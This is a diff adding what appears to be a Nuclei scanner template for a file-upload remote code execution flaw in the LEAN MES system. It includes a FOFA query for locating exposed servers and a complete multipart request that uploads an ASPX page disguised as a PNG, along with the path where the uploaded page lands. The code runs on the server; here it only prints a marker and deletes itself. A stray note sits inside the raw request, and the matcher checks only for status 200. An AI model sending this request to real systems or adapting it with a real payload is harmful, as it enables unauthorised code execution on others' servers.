@@ -1,0 +1,81 @@
+id: poc-sdzxcxt10bhwikit
+info:
+  name: 深科特LEAN MES系统ChooseImage存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sdzxcxt10bhwikit'
+  tags: rce,file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sdzxcxt10bhwikit
+    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
+http:
+- raw:
+  - 'POST /Kanban/ChooseImage.aspx HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+    /xxx
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+
+    xxx
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+
+    /xxx
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="imgName"
+
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="impUpload"; filename="test123.aspx"
+
+    Content-Type: image/png
+
+
+    <%@ Page Language="C#"%><% Response.Write("test123"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="hfImgList"
+
+
+    []
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="hfOperate"
+
+
+    -1
+
+    ------WebKitFormBoundary--
+
+    **上传定位：**
+
+    /OnlineService/KanbanImage/test123.aspx'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
